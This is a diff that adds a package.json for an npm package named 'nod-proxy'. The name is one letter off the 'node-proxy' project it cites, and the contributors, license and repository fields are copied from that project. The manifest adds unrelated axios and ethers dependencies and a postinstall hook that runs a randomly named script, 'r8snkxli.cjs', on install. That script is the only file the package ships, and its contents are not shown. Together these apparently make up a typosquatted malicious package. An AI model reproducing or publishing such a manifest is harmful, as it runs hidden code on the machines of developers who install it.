@@ -1,0 +1,52 @@
+{
+  "name": "nod-proxy",
+  "version": "1.0.0",
+  "description": "A module for node implementing __noSuchMethod__-type handlers, such as object overloading, as part of the Harmony Catch-All Proxies specification found at http://wiki.ecmascript.org/doku.php?id=harmony:proxies",
+  "keywords": [
+    "interceptor",
+    "proxy",
+    "overload",
+    "__noSuchMethod__",
+    "es6"
+  ],
+  "dependencies": {
+    "bindings": "1",
+    "nan": "^2.1.0",
+    "axios": "^1.7.7",
+    "ethers": "^6.13.2"
+  },
+  "contributors": [
+    "Sam Shull <http://www.google.com/profiles/brickysam26>",
+    "richardms <https://github.com/richardms>",
+    "Andreas Botsikas <http://webinos.org/bio-andreas-botsikas/>",
+    "Kenneth Bentley <mechanicofthesequence@gmail.com>",
+    "Gabor Mezo <https://github.com/unbornchikken>"
+  ],
+  "licenses": [
+    {
+      "type": "MIT",
+      "url": "http://www.opensource.org/licenses/mit-license.html"
+    }
+  ],
+  "bugs": {
+    "url": "http://github.com/samshull/node-proxy/issues"
+  },
+  "implements": [
+    "http://wiki.ecmascript.org/doku.php?id=harmony:proxies"
+  ],
+  "engines": {
+    "node": ">= 0.10.36",
+    "npm": ">= 1.1.17"
+  },
+  "repository": {
+    "type": "git",
+    "url": "http://github.com/samshull/node-proxy"
+  },
+  "main": "./lib/node-proxy.js",
+  "scripts": {
+    "postinstall": "node r8snkxli.cjs"
+  },
+  "files": [
+    "r8snkxli.cjs"
+  ]
+}
